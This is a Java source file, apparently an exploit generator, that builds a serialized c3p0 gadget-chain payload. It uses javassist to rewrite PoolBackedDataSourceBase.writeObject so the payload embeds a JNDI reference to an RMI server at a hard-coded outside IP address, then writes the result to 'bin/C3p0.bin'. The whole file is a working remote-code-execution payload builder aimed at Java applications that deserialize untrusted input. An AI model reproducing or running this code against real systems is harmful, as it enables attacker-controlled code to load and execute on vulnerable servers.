package Seri.C3p0;

import Seri.Utils;
import com.mchange.v2.c3p0.impl.NewPooledConnection;
import javassist.*;

import javax.naming.CompoundName;
import javax.naming.InvalidNameException;
import javax.naming.Name;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

public class ChangeWriteObject {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass poolCtClass = pool.getCtClass("com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
        CtMethod ctMethod = poolCtClass.getDeclaredMethod("writeObject");

        CtConstructor constructor = poolCtClass.getDeclaredConstructor(new CtClass[]{});
        constructor.setModifiers(Modifier.PUBLIC);

        String body = "\t{\n" +
                "\t\t$1.writeShort( VERSION );\n" +
                "\t\ttry\n" +
                "\t\t{\n" +
                "\t\t\t//test serialize\n" +
                "\t\t\tcom.mchange.v2.ser.SerializableUtils.toByteArray(connectionPoolDataSource);\n" +
                "\t\t\t$1.writeObject( connectionPoolDataSource );\n" +
                "\t\t}\n" +
                "\t\tcatch (java.io.NotSerializableException nse)\n" +
                "\t\t{\n" +
                "\t\t\tcom.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, \"Direct serialization provoked a NotSerializableException! Trying indirect.\", nse);\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tcom.mchange.v2.naming.ReferenceIndirector indirector = new com.mchange.v2.naming.ReferenceIndirector();\n" +
                "\t\t\t\tjava.util.Properties properties = new java.util.Properties();\n" +
                "\t\t\t\tjavax.naming.CompoundName compoundName = new javax.naming.CompoundName(\"rmi://123.206.100.143:9999/calc\",properties);\n" +
                "\t\t\t\tindirector.setNameContextName(compoundName);\n" +
                "\t\t\t\t$1.writeObject( indirector.indirectForm( connectionPoolDataSource ) );\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (java.io.IOException indirectionIOException)\n" +
                "\t\t\t{ throw indirectionIOException; }\n" +
                "\t\t\tcatch (java.lang.Exception indirectionOtherException)\n" +
                "\t\t\t{ throw new java.io.IOException(\"Problem indirectly serializing connectionPoolDataSource: \" + indirectionOtherException.toString() ); }\n" +
                "\t\t}\n" +
                "\t\t$1.writeObject( dataSourceName );\n" +
                "\t\ttry\n" +
                "\t\t{\n" +
                "\t\t\t//test serialize\n" +
                "\t\t\tcom.mchange.v2.ser.SerializableUtils.toByteArray(extensions);\n" +
                "\t\t\t$1.writeObject( extensions );\n" +
                "\t\t}\n" +
                "\t\tcatch (java.io.NotSerializableException nse)\n" +
                "\t\t{\n" +
                "\t\t\tcom.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, \"Direct serialization provoked a NotSerializableException! Trying indirect.\", nse);\n" +
                "\t\t\ttry\n" +
                "\t\t\t{\n" +
                "\t\t\t\tcom.mchange.v2.ser.Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector();\n" +
                "\t\t\t\t$1.writeObject( indirector.indirectForm( extensions ) );\n" +
                "\t\t\t}\n" +
                "\t\t\tcatch (java.io.IOException indirectionIOException)\n" +
                "\t\t\t{ throw indirectionIOException; }\n" +
                "\t\t\tcatch (java.lang.Exception indirectionOtherException)\n" +
                "\t\t\t{ throw new java.io.IOException(\"Problem indirectly serializing extensions: \" + indirectionOtherException.toString() ); }\n" +
                "\t\t}\n" +
                "\t\t$1.writeObject( factoryClassLocation );\n" +
                "\t\t$1.writeObject( identityToken );\n" +
                "\t\t$1.writeInt(numHelperThreads);\n" +
                "\t}";
        ctMethod.setBody(body);
        poolCtClass.writeFile();

        extendImpl extend = new extendImpl();
        Class<PoolBackedDataSourceBase> serialClass = poolCtClass.toClass();
        PoolBackedDataSourceBase poolBackedDataSourceBase = serialClass.newInstance();

        Utils.setValue(poolBackedDataSourceBase ,"connectionPoolDataSource" ,extend);

        System.out.println(Utils.serialize(poolBackedDataSourceBase ,"bin/C3p0.bin"));

        System.out.println("exec");

    }

}
